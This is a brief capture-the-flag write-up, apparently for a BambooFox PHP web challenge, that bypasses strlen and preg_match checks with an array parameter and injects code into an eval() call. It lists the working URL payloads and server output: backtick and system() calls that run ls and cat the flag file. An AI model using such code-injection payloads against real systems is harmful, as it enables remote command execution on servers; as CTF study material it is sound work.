@@ -1,0 +1,25 @@
+Bypass strlen and preg_match
+	Use array
+
+ヽ(#`Д´)ﾉ
+=> %E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89
+
+http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[]=print_r(`ls`)
+	Parse error: syntax error, unexpected end of file in /var/www/html/index.php(1) : eval()'d code on line 5
+
+http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[]=print_r(`ls`)?>
+	Parse error: syntax error, unexpected '?>', expecting ')' in /var/www/html/index.php(1) : eval()'d code on line 3
+
+http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[]=print_r(`ls`))?>
+	index.php
+
+http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[]=print_r(`ls /`))?>
+	bin boot dev etc flag_de42537a7dd854f4ce27234a103d4362 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+
+http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[]=print_r(`cat /flag_de42537a7dd854f4ce27234a103d4362`))?>
+	flag{!pee_echi_pee!}
+
+############# Other Solution #############
+
+http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD%28%23%60%D0%94%C2%B4%29%EF%BE%89[]=system('cat /flag_de42537a7dd854f4ce27234a103d4362'))?>
+	flag{!pee_echi_pee!}
